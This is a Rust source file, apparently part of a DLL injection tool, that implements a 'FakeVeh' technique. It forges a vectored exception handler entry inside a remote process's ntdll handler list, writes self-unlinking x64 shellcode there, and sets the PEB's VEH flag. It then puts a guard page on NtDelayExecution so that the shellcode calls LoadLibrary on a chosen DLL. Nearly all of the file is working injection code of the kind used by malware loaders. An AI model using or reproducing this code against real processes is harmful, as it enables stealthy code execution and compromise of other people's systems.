use std::{ffi::c_void, mem::offset_of};

use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::EXCEPTION_GUARD_PAGE, System::{Diagnostics::Debug::EXCEPTION_CONTINUE_EXECUTION, Kernel::LIST_ENTRY, Memory::{PAGE_EXECUTE_READ, PAGE_GUARD, PAGE_READWRITE}, Threading::{PROCESS_BASIC_INFORMATION, SRWLOCK}}}};

use dynasmrt::{dynasm, DynasmApi, DynasmLabelApi};
use crate::{
    executor::ExecutionMethod,
    symbols::SymbolHandler,
    wrappers::{AllocatedMemory, CrossProcessFlags, Module, Peb, RemoteAllocator as _, RemoteProcess}
};

#[repr(C)]
#[derive(Debug)]
struct _RTL_VECTORED_HANDLER_LIST {
    Lock: SRWLOCK,
    List: LIST_ENTRY
 
}

#[repr(C)]
#[derive(Debug)]
struct RTL_VECTORED_EXCEPTION_ENTRY {
    List: LIST_ENTRY,
    pFlag: *mut usize,
    RefCount: u32,
    _padding: u32,
    VectoredHandler: *const c_void, // PVECTORED_EXCEPTION_HANDLER
    Flag: usize,
}

// FOR DEBUGGING:
pub fn dbg_peb_is_using_veh(remote_process: &RemoteProcess) -> Result<bool, Box<dyn std::error::Error>> {
    let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;
    let peb: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };
    let cross_flags = unsafe { peb.cross_process_flags_union.flags };

    let is_using_veh = cross_flags.contains(CrossProcessFlags::PROCESS_USING_VEH);
    println!("[*] PEB ({:?})->ProcessUsingVEH: {}", pbi.PebBaseAddress, is_using_veh);

    Ok(is_using_veh)
}

pub struct FakeVeh;

impl ExecutionMethod for FakeVeh {
    fn execute(
        remote_process: &RemoteProcess,
        inject_func_addr: usize,
        dll_path_mem_alloc: &AllocatedMemory,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let symbol_handler = SymbolHandler::new(remote_process)?;
        let remote_module = remote_process.get_module("ntdll.dll")?;
        let veh_list_addr = symbol_handler.get_symbol_address(
            &remote_module,
            "LdrpVectorHandlerList",
        )?;

        let was_using_veh = dbg_peb_is_using_veh(remote_process)?;

        // Read the VEH list head structure
        let vectored_list: _RTL_VECTORED_HANDLER_LIST = unsafe {
            remote_process.read_struct(veh_list_addr as *const c_void)?
        };

        // Calculate the address of the List field within LdrpVectorHandlerList
        let list_head_addr = veh_list_addr + offset_of!(_RTL_VECTORED_HANDLER_LIST, List);
        
        println!("[*] VEH List Head address: {:#x}", list_head_addr);
        println!("[*] Initial Flink: {:#x}", vectored_list.List.Flink as usize);
        println!("[*] Initial Blink: {:#x}", vectored_list.List.Blink as usize);

        let old_first_entry_ptr = vectored_list.List.Flink;
        
        let fake_veh_malloc = remote_process.alloc(
            std::mem::size_of::<RTL_VECTORED_EXCEPTION_ENTRY>(),
            false
        )?;
        let fake_veh_addr: usize = fake_veh_malloc.as_ptr() as usize;
        println!("[+] Allocated fake VEH entry at: {:#x}", fake_veh_addr);

        let flag_offset = offset_of!(RTL_VECTORED_EXCEPTION_ENTRY, Flag);

       // sc0de - shellcode (mr. i hate sc0de but i use git shortcuts like gs)
        let stub = build_shcode(
            inject_func_addr as u64,
            dll_path_mem_alloc.as_ptr() as u64,
            fake_veh_addr as u64,
            list_head_addr as u64
        )?;
        let shellcode_ptr = remote_process.alloc(stub.len(), true)?;
        shellcode_ptr.write(&stub)?;
        println!("[+] Shellcode written to: {:#x}", shellcode_ptr.as_ptr() as usize);

        let encoded_shellcode = remote_process.encode_pointer(shellcode_ptr.as_ptr() as usize)?;
        println!("[+] Encoded shellcode pointer: {:#x}", encoded_shellcode);
        // end sc0de

        let fake_veh = RTL_VECTORED_EXCEPTION_ENTRY {
            List: LIST_ENTRY {
                Flink: old_first_entry_ptr,
                Blink: list_head_addr as *mut _,
            },
            pFlag: (fake_veh_malloc.as_ptr() as usize + flag_offset) as *mut usize,
            RefCount: 1,
            _padding: 0,
            VectoredHandler: encoded_shellcode as *const c_void,
            Flag: 1,
        };

        println!("\n[*] Fake VEH entry structure:");
        println!("    Flink: {:#x}", fake_veh.List.Flink as usize);
        println!("    Blink: {:#x}", fake_veh.List.Blink as usize);
        println!("    pFlag: {:#x}", fake_veh.pFlag as usize);
        println!("    VectoredHandler (encoded): {:#x}", fake_veh.VectoredHandler as usize);
        println!("    Flag: {}", fake_veh.Flag);

        fake_veh_malloc.write_struct(&fake_veh)?;
        println!("[+] Fake VEH entry written to target process");
        
        // we write ONLY the pointer (to a struct) value (usize), not a struct!
        let list_head_flink_addr = list_head_addr + offset_of!(LIST_ENTRY, Flink);
        let list_head_old_prot = remote_process.set_protection(
            list_head_flink_addr as *mut c_void,
            std::mem::size_of::<usize>(),
            PAGE_READWRITE
        )?;
        
        unsafe {
            remote_process.write_struct(list_head_flink_addr as *mut c_void, &fake_veh_addr)?;
        }
        println!("[+] Updated list_head.Flink to point to fake VEH");

        // if the list is not empty (old_first_entry != list_head)
        // then update old_first_entry.Blink to point to our fake entry
        if old_first_entry_ptr as usize != list_head_addr {
            println!("[*] Original VEH List is not empty, updating old first entry's Blink");

            let old_first_blink_addr = (old_first_entry_ptr as usize + offset_of!(LIST_ENTRY, Blink)) as *mut c_void;
            
            let old_first_old_prot = remote_process.set_protection(
                old_first_blink_addr,
                std::mem::size_of::<usize>(),
                PAGE_READWRITE
            )?;

            unsafe { 
                remote_process.write_struct(
                    old_first_blink_addr,
                    &fake_veh_addr
                )
            }?;
            println!("[+] Updated old first entry's Blink to point to fake VEH");
            
            // TODO: Figure out how to restore protection AFTER!!! succesful injection
            // shellcode internally unlinks our VEH before loading library so it needs to
            // be on page_readwrite during sc execution
            // // restore protection
            // remote_process.set_protection(
            //     old_first_blink_addr,
            //     std::mem::size_of::<usize>(),
            //     old_first_old_prot
            // )?;
        } else {
            println!("[*] list is empty, also updating list_head.Blink...");
                        
            let list_head_blink_addr = (list_head_addr + offset_of!(LIST_ENTRY, Blink)) as *mut c_void;
            unsafe {
                remote_process.write_struct(
                    list_head_blink_addr,
                    &fake_veh_addr
                )
            }?;
            println!("[+] updated list_head.Blink to point to fake VEH");
        }

        // // restore protection
        // remote_process.set_protection(
        //     list_head_addr as *mut c_void,
        //     std::mem::size_of::<usize>(),
        //     list_head_old_prot
        // )?;

        println!("[+] list pwning (re-linking) done");

        dbg_peb_is_using_veh(remote_process)?;

        if !was_using_veh {
            println!("[*] Setting ProcessUsingVEH flag");
            let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;
            let mut peb: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };

            unsafe {
                peb.cross_process_flags_union.flags.insert(CrossProcessFlags::PROCESS_USING_VEH);
            }

            let cross_flags_addr = (pbi.PebBaseAddress as usize + offset_of!(Peb, cross_process_flags_union)) as *mut c_void;
            unsafe {
                remote_process.write_struct(cross_flags_addr, &peb.cross_process_flags_union)?;
            }

            // Verify
            let peb_verify: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };
            let flags_verify = unsafe { peb_verify.cross_process_flags_union.flags };
            println!("[+] ProcessUsingVEH flag set: {}", flags_verify.contains(CrossProcessFlags::PROCESS_USING_VEH));
        }

        // trigger exec
        println!("\n[*] triggering VEH by setting PAGE_GUARD...");

        let ntdll = remote_process.get_module("ntdll.dll")?;
        let nt_delay_execution_addr = ntdll.get_func_addr("NtDelayExecution")?;

        let _old_nt_delay_execution_prot = remote_process.set_protection(nt_delay_execution_addr as *mut c_void, 1, PAGE_EXECUTE_READ | PAGE_GUARD)?;
        println!("[+] PAGE_GUARD set on NtDelayExecution");
        
        // wait for injection
        // println!("[*] waiting for target process to trigger VEH...");
        // std::thread::sleep(std::time::Duration::from_secs(5));

        // dbg_peb_is_using_veh(remote_process)?;
        std::mem::forget(shellcode_ptr);
        std::mem::forget(fake_veh_malloc);

        Ok(())
    }
}

fn build_shcode(
    inject_func_ptr: u64,
    dll_path_ptr: u64,
    fake_entry_addr: u64,
    list_head_addr: u64,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut ops: dynasmrt::Assembler<dynasmrt::x64::X64Relocation> = dynasmrt::x64::Assembler::new()?;

    dynasm!(ops
        ; .arch x64

        // --- Exception Check prologue ---
        ; test  rcx, rcx
        ; jz    ->continue_search

        ; mov   rax, [rcx]
        ; test  rax, rax
        ; jz    ->continue_search

        ; mov   edx, [rax]
        ; cmp   edx, EXCEPTION_GUARD_PAGE.0 as i32
        ; jne   ->continue_search
        // --- END ---

        // --- self-cleanup: Unlink the fake handler from the list ---
        ; mov   rdx, QWORD list_head_addr as i64  // rdx = list_head_addr
        ; mov   rcx, [rdx]                        // rcx = head->Flink(+0x00) (start of list)

        ; ->cleanup_loop:
        ; cmp   rcx, rdx
        //; if we have looped back to the head then our entry wasn't found -> skip cleanup
        ; je    ->no_cleanup    

        ; mov   r8, QWORD fake_entry_addr as i64  // r8 = fake_entry_addr
        ; cmp   rcx, r8           
        ; je    ->found_entry //; if the current entry == our fake entry, jump to VEH unlinking

        ; mov rcx, [rcx]         // Move to next entry: current = current->Flink
        ; jmp ->cleanup_loop

        ; ->found_entry:
        // found our entry, unlink it.
        ; mov   rax,       [rcx]         // rax = current->Flink (the "next" node)
        ; mov   r9,        [rcx + 8]     // rsi = current->Blink (the "prev" node)
        ; mov   [r9],      rax         // prev->Flink = next
        ; mov   [rax + 8], r9     // next->Blink = prev

        ; ->no_cleanup:
        // call DLL load pRoutine (LoadLibrary/LdrLoadDll...)
        ; sub   rsp, 0x28
        ; mov   rcx, QWORD dll_path_ptr as i64    //; arg1: dll_path_ptr
        ; mov   rax, QWORD inject_func_ptr as i64 //; fn to call: inject_func_ptr (LoadLibrary)
        ; call  rax
        ; add   rsp, 0x28

        // --- Epilogue ---
        ; mov eax, EXCEPTION_CONTINUE_EXECUTION as i32 // Return -1
        ; ret

        ; ->continue_search:
        ; xor eax, eax                         // Return 0 (EXCEPTION_CONTINUE_SEARCH)
        ; ret
    );

    Ok(ops.finalize().unwrap().to_vec())
}